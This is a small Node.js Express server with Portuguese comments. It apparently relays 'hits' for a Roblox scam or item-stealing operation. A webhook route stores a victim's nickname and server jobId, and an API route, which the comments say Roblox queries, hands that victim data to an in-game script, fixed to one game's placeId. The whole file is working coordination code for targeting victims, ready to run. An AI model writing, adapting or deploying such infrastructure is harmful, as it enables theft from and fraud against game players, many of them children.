const express = require('express');
const app = express();
app.use(express.json());

let currentHit = {
    jobId: null,
    victimNick: null,
    placeId: 142823291
};

// Rota para o seu Webhook enviar o hit
app.post('/webhook', (req, res) => {
    const { jobId, victimNick } = req.body;
    if (!jobId || !victimNick) return res.status(400).send("Faltam dados.");
    
    currentHit = { jobId, victimNick, placeId: 142823291 };
    console.log(`Hit Recebido: ${victimNick}`);
    res.send("OK");
});

// Rota que o Roblox consulta
app.get('/api/next', (req, res) => {
    res.json(currentHit);
});

// Rota para limpar o hit manualmente
app.get('/api/clear', (req, res) => {
    currentHit = { jobId: null, victimNick: null, placeId: 142823291 };
    res.send("Limpo");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Rodando na porta ${PORT}`));
